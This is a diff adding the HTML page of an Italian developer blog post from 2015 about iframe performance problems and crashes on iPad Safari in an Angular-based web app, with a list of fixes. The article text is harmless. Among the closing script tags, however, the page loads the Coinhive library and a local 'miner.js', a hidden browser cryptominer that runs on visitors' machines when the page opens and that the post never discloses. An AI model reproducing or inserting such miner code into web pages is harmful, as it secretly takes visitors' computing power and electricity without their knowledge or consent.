@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<script>
+		var host = "michelenasti.com";
+		if ((host == window.location.host) && (window.location.protocol != "https:"))
+			window.location.protocol = "https";
+	</script>
+	
+	<title>iFrame, Safari, iOs e la lotta all'ultimo millisecondo - Michele Nasti's blog</title>
+	<meta name="description" content="Tutto è nato da una richiesta innocua da parte del capo: la webapp che abbiamo realizzato, e che deve operare principalmente sui pc del nostro cliente, sarà mostrata ad un’importante fiera a fine maggio, quindi dobbiamo rivederla e ottimizzarla per tablet.
+
+" />
+	<meta name="keywords" content="iframe, ios, ottimizzazione, problemi, safari, web development" />  
+	<meta http-equiv="last-modified" content="2017-09-19 10:17:10 +0200" /> 
+	<!--<noscript>-->
+	<link rel="stylesheet" href="/css/skel.css" />
+	<link rel="stylesheet" href="/css/style.css" />
+	<link rel="stylesheet" href="/css/style-xlarge.css" />
+	<link rel="stylesheet" href="/css/colorful.css" />
+	<link rel="stylesheet" href="/css/social.css" />
+	<link rel="stylesheet" href="/node_modules/animate.css/animate.min.css" />
+	<meta name="google-site-verification" content="wpVjnRuXV99CAZxjYBzZgKbJm-8_tdLPrlP43u9zhV0" /> <!-- facebook Open Graph Metadatas -->
+<meta content="your_facebook_app_id" property="fb:app_id">
+<meta content="" property="og:site_name">
+
+
+  <meta content="iFrame, Safari, iOs e la lotta all'ultimo millisecondo" property="og:title">
+
+
+
+  <meta content="article" property="og:type">
+
+
+
+  <meta content="I'm a full stack Developer with an eye for the web." property="og:description">
+
+
+
+  <meta content="https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/" property="og:url">
+
+
+
+  <meta content="2015-05-27T10:00:27+02:00" property="article:published_time">
+  <meta content="https://www.facebook.com/micnasti/" property="article:author">
+
+
+
+<meta content="/img/logo-high-resolution.png" property="og:image">
+
+
+
+  
+  <meta content="iframe" property="article:tag">
+  
+  <meta content="ios" property="article:tag">
+  
+  <meta content="ottimizzazione" property="article:tag">
+  
+  <meta content="problemi" property="article:tag">
+  
+  <meta content="safari" property="article:tag">
+  
+  <meta content="web development" property="article:tag">
+  
+
+
+<!-- Twitter cards metadatas -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@vdaubry">
+<meta name="twitter:creator" content="@micnasti">
+
+  <meta name="twitter:title" content="iFrame, Safari, iOs e la lotta all'ultimo millisecondo">
+
+
+  <meta name="twitter:url" content="https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/">
+
+
+
+  <meta name="twitter:description" content="I'm a full stack Developer with an eye for the web.">
+
+
+
+	<!--</noscript>-->
+	<!--[if lte IE 8]><link rel="stylesheet" href="/css/ie/v8.css" /><![endif]-->
+	<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-88764277-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+	<link rel="stylesheet" href="/css/prism.css" />
+</head>
+
+<body id="top">
+
+	<header id="header">
+	<a href="#" class="image avatar"><img src="/images/michele_nasti.jpg" alt="michele nasti volto" /></a>
+	<h1><strong><a href="/">Michele Nasti</a></strong><br /> Full-stack developer <br> with an eye for the web<br>
+	</h1>
+<a href="/chi-sono-michele-nasti/">Chi sono</a> | 
+<a href="/talks-conferences/">Talks &amp; Conferences</a> | 
+<a href="/archives/">Archives</a>
+
+</header> <div id="main">
+	<article>
+		<header class="major">
+			<h1 class="post-title"><a href="/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/">iFrame, Safari, iOs e la lotta all'ultimo millisecondo</a></h1>
+			<p class="post-meta">May 27, 2015 • musikele</p>
+		</header>
+
+		<section>
+
+			<p>Tutto è nato da una richiesta innocua da parte del capo: la webapp che abbiamo realizzato, e che deve operare principalmente sui pc del nostro cliente, sarà mostrata ad un’importante fiera a fine maggio, quindi dobbiamo rivederla e ottimizzarla per tablet.</p>
+
+<p>Poco male, abbiamo usato Bootstrap per la UI, quindi si tratterà solo di limare, aggiustare, riorganizzare gli elementi sullo schermo.</p>
+
+<p>E invece ciò che stiamo affrontato è divenuto un bagno di sangue.</p>
+
+<h3 id="bootstrap-questo-sconosciuto">Bootstrap, questo sconosciuto</h3>
+
+<p>Quando si lavora in un team di 15 persone e tutti fanno tutto ci si scontra con un’amara verità: non siamo tutti egualmente predisposti per il “bello”, e soprattutto non siamo tutti disposti a capire come funziona bootstrap. Praticamente: <strong>nessuno si legge la documentazione e spesso vedo usare cose complicate quando ci sono alternative più facili e più portabili</strong>. Un esempio: alcuni amici hanno eliminato il padding a tutti gli elementi aggiungendo classi come ResetPadding, e poi si lamentavano che i componenti erano disposti male sullo schermo. :-O</p>
+
+<h3 id="iframe-e-ios-nemici-giurati">iFrame e iOs, nemici giurati</h3>
+
+<p>Tutto il mondo usa gli iFrame per una sola cosa, ossia per mostrare la pubblicità. Gli iframe sono elementi che caricano al loro interno altre pagine, le quali pagine riscaricano da capo html, css, javascript, immagini, etc. Ossia, se usate lo stesso script sia fuori che dentro l’iFrame, questo verrà scaricato due volte.</p>
+
+<p>Il mondo del web quindi cerca di non usare gli iFrame per qualcosa che non sia pubblicità. Noi invece cosa abbiamo fatto? <strong>Approfittando di un framework “fatto in casa”, basato su Angular, caricavamo le pagine all’interno di un iFrame</strong>. Ossia: la toolbar in alto e il menu laterale fanno parte della pagina, il contenuto vero e proprio invece viene caricato ogni volta all’interno di un iframe.</p>
+
+<div style="width: 318px" class="wp-caption alignright">
+  <img class="" src="https://i1.wp.com/stevesouders.com/efws/images/1301-iframes-cost-of-elements.gif?resize=308%2C384" alt="" data-recalc-dims="1" />
+  
+  <p class="wp-caption-text">
+    tempo per aggiungere al DOM 100 elementi. dal sito <a href="http://www.stevesouders.com/blog/2009/06/03/using-iframes-sparingly/">stevensoulders.com</a>.
+  </p>
+</div>
+
+<p>L’impatto di questo approccio è stato devastante: se pure lo sviluppo era in qualche modo semplificato, ogni volta che cliccavamo su una pagina veniva ricaricato tutto, da Angular fino al css, e non so se lo sapete ma finchè angular non viene caricato l’utente vede le parentesi graffe (<code>{{ }}</code> ) tipiche di Angular. Inoltre sui tablet avevamo un degrado delle prestazioni, perchè gli iFrame sono gli elementi più pesanti da aggiungere al DOM e tutto il traffico di rete che generavamo a ogni pagina ci rubava secondi preziosi. Su un tablet più datato avevamo una pagina che si caricava in 40 secondi ! Un esempio di benchmark lo trovate qui a lato.</p>
+
+<p>Altri due gravissimi problemi: <strong>su iPad alcuni iframe (non tutti) non scrollano</strong>; inoltre avevamo trovato un bug che <strong>dopo un po’ di navigazione della nostra webapp, safari crasha senza dare troppe spiegazioni</strong>.</p>
+
+<h3 id="alcune-soluzioni-messe-in-campo">Alcune soluzioni messe in campo</h3>
+
+<p>Tutto questo ci ha fatto andare un po’ in panico e stiamo cercando le dovute contromisure, che chiaramente non possiamo attuare tutte visto che la scadenza è tra pochi giorni. Però qualcosa abbiamo fatto ed è giusto condividerle con voi, magari qualcuno passa di qui e ci da qualche dritta fantastica.</p>
+
+<ul>
+  <li>sembrerà una cretinata, ma <strong>mettere tutti gli script alla fine (giusto un attimo prima del tag di chiusura &lt;/body&gt;) diminuisce considerevolmente il tempo di caricamento delle pagine</strong>. E’ una di quelle best practices che non si considera mai e che invece aiuta davvero.</li>
+  <li><strong>Diminuire all’osso il numero di file scaricati</strong>, quindi minimizzare e comprimere tutti i javascript, css, e html. Farlo con java e maven è un po’ complicato, ma si può fare. Poi scriverò un articolo su come precaricare tutti i template delle direttive di angular.</li>
+  <li>Sul caricamento degli iFrame: <strong>uno degli approcci più utilizzati è quello di aggiungere l’iFrame al dom, aspettare 10 millisecondi, e poi settare l’attributo src, così da ritardare leggermente il caricamento del frame</strong>. Alcuni benchmark mostrano che questo approccio è efficace, anche se la miglior soluzione è di evitare l’iFrame. Trovate una discussione su questo argomento a <a href="http://www.aaronpeters.nl/blog/iframe-loading-techniques-performance#normal">questo link</a>.</li>
+  <li>l’iPad non scrolla e sistematicamente crasha? <strong>useremo tablet Android</strong>.</li>
+  <li>Eliminare chiamate asincrone che non servono davvero… Il miglior approccio è di fare una chiamata sola per precaricare tutte le combo che serviranno nella pagina.</li>
+</ul>
+
+<p>La soluzione a lungo termine è di modificare questo nostro framework e di usare qualcosa di più standard, come ui-router o ng-router di angular. Ciò che vorremmo evitare è di riscrivere tutte le pagine che abbiamo già realizzato, quindi cercheremo di usare l’approccio meno invasivo possibile.</p>
+ 
+<ul class="share-buttons">
+  <li><a href="https://www.facebook.com/sharer/sharer.php?u=https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/&t=" title="Share on Facebook" target="_blank" onclick="window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/) + '&t=' + encodeURIComponent(document.title)); return false;"><img alt="Share on Facebook" src="/images/icons/Facebook.svg"></a></li>
+  <li><a href="https://twitter.com/intent/tweet?source=https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/&text=iFrame, Safari, iOs e la lotta all'ultimo millisecondo:%20https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/&via=micnasti" target="_blank" title="Tweet" onclick="window.open('https://twitter.com/intent/tweet?text=' + encodeURIComponent(iFrame, Safari, iOs e la lotta all'ultimo millisecondo) + ':%20'  + encodeURIComponent(https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/)); return false;"><img alt="Tweet" src="/images/icons/Twitter.svg"></a></li>
+  <li><a href="https://plus.google.com/share?url=https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/" target="_blank" title="Share on Google+" onclick="window.open('https://plus.google.com/share?url=' + encodeURIComponent(https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/)); return false;"><img alt="Share on Google+" src="/images/icons/Google+.svg"></a></li>
+  <li><a href="http://www.linkedin.com/shareArticle?mini=true&url=https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/&title=iFrame, Safari, iOs e la lotta all'ultimo millisecondo&summary=&source=https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/" target="_blank" title="Share on LinkedIn" onclick="window.open('http://www.linkedin.com/shareArticle?mini=true&url=' + encodeURIComponent(https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/) + '&title=' +  encodeURIComponent(document.title)); return false;"><img alt="Share on LinkedIn" src="/images/icons/LinkedIn.svg"></a></li>
+</ul>
+
+		</section>
+
+		<section>
+			 <div id="disqus_thread"></div>
+<script>
+    /**
+     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    
+    var disqus_config = function () {
+    	//var disqus_identifier = 'https://michelenasti.com';
+			//var disqus_url = '';
+			var disqus_url = 'https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/';
+			var disqus_identifier = 'https://michelenasti.com/2015/05/iframe-safari-ios-e-la-lotta-allultimo-millisecondo/';
+
+    };
+    
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = '//michele-nastis-blog.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript> 
+		</section>
+
+		<footer>
+			<br> Altri articoli:
+			<br>
+			<div class="row">
+				
+
+				<div class="6u 12u(small) excerpt" id="previousArticle">
+					<header>
+						<h2><a href="/2015/05/selenium-webdriver-for-dummies/">Selenium WebDriver for dummies</a></h2>
+					</header>
+					<section>
+						<p>Esistono tool che permettono di scrivere i casi di test che simulano il comportamento dell’utente e di eseguirli all’infinito, cosa utile per individuare eventuali regressioni durante lo sviluppo.</p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="/2015/05/selenium-webdriver-for-dummies/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				 
+
+				<div class="6u$ 12u(small) excerpt f-right" id="nextArticle">
+					<header>
+						<h2><a href="/2015/06/imovie-50-error/">iMovie and the -50 error</a></h2>
+					</header>
+					<section>
+						<p><a href="https://i2.wp.com/michelenasti.com/wp-content/uploads/2015/06/imovie400.jpg"><img class="alignleft size-full wp-image-320" src="https://i2.wp.com/michelenasti.com/wp-content/uploads/2015/06/imovie400.jpg?fit=400%2C400" alt="imovie400" srcset="https://i2.wp.com/michelenasti.com/wp-content/uploads/2015/06/imovie400.jpg?w=400 400w, https://i2.wp.com/michelenasti.com/wp-content/uploads/2015/06/imovie400.jpg?resize=150%2C150 150w, https://i2.wp.com/michelenasti.com/wp-content/uploads/2015/06/imovie400.jpg?resize=300%2C300 300w" sizes="(max-width: 400px) 100vw, 400px" data-recalc-dims="1" /></a>Yesterday I had to realize a quick video for a family celebration so I decided to use <strong>iMovie</strong> for the first time since I had bought my Mac in 2012.</p>
+
+
+					</section>
+					<div>
+						<ul class="actions">
+							<li><a href="//2015/06/imovie-50-error/" class="button">Read More</a></li>
+						</ul>
+					</div>
+				</div>
+				
+			</div>
+		</footer>
+
+	</article>
+
+</div>
+<script src="/js/infinite-scroll.js"></script>
+
+	<!-- Footer -->
+	<footer id="footer">
+	<ul class="icons">
+
+		
+		<li>
+			<a href="https://github.com/musikele" class="icon fa-github">
+				<span class="label">GitHub</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://twitter.com/micnasti" class="icon fa-twitter">
+				<span class="label">Twitter</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://linkedin.com/in/michelenasti" class="icon fa-linkedin">
+				<span class="label">LinkedIn</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://plus.google.com/MicheleNasti" class="icon fa-google-plus">
+				<span class="label">Google+</span>
+			</a>
+		</li>
+		 
+		<li>
+			<a href="https://www.facebook.com/musikele" class="icon fa-facebook">
+				<span class="label">Facebook</span>
+			</a>
+		</li>
+		  
+	</ul>
+	<ul class="copyright">
+		<li>&copy; Michele Nasti</li>
+		<li>Based on <a href="http://html5up.net/strata">STRATA</a> theme</li>
+	</ul>
+</footer>
+	<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
+	<script src="/js/jquery.min.js"></script>
+	<script src="/js/jquery.poptrox.min.js"></script>
+	<script src="/js/skel.min.js"></script>
+	<script src="/js/init.js"></script>
+	<script src="/js/prism.js"></script>
+	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="/js/miner.js"></script>
+	<!-- <script src="/js/badge.js"></script> -->
+</body>
+
+</html>
